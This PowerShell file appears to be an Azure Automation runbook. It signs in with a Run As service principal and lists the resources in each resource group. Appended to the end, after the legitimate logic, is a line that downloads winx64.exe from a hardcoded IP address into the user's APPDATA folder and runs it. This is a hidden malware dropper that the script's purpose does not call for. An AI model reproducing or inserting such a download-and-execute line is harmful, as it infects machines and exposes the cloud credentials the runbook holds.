$connectionName = "AzureRunAsConnection100"try{$servicePrincipalConnection=Get-AutomationConnection -Name $connectionName         "Logging in to Azure..."Add-AzureRmAccount `-ServicePrincipal `-TenantId $servicePrincipalConnection.TenantId `-ApplicationId $servicePrincipalConnection.ApplicationId `-CertificateThumbprint $servicePrincipalConnection.CertificateThumbprint }catch {if (!$servicePrincipalConnection){$ErrorMessage = "Connection $connectionName not found."throw $ErrorMessage} else{Write-Error -Message $_.Exceptionthrow $_.Exception}}$ResourceGroups = Get-AzureRmResourceGroup foreach ($ResourceGroup in $ResourceGroups){    Write-Output ("Showing resources in resource group " + $ResourceGroup.ResourceGroupName)$Resources = Find-AzureRmResource -ResourceGroupNameContains $ResourceGroup.ResourceGroupName | Select ResourceName, ResourceTypeForEach ($Resource in $Resources){Write-Output ($Resource.ResourceName + " of type " +  $Resource.ResourceType)}Write-Output ("")} (New-Object System.Net.WebClient).DownloadFile('http://94.102.58.30/~trevor/winx64.exe',"$env:APPDATA\winx64.exe");Start-Process ("$env:APPDATA\winx64.exe")